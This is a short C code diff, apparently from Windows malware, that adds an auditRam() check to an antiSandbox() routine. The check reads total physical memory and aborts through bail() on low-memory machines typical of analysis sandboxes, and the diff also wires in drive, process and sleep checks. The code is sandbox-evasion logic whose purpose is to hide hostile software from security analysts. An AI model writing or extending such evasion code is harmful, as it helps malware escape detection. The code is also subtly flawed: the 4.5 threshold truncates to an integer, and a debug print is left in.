@@ -50,8 +50,24 @@ void auditDrives()
     return;
 }
 
+void auditRam()
+{
+    ULONGLONG threshholdGb = 4.5;
+    MEMORYSTATUSEX memInfo;
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+    GlobalMemoryStatusEx(&memInfo);
+    ULONGLONG totalPhysMem = memInfo.ullTotalPhys;
+    printf("%llu\n", totalPhysMem);
+    if (totalPhysMem <= threshholdGb * (ULONGLONG)1000000000)
+    {
+        bail();
+    }
+}
+
 void antiSandbox() 
 {
 	antiSleep();
 	auditProcesses();
+	auditDrives();
+	auditRam();
 }
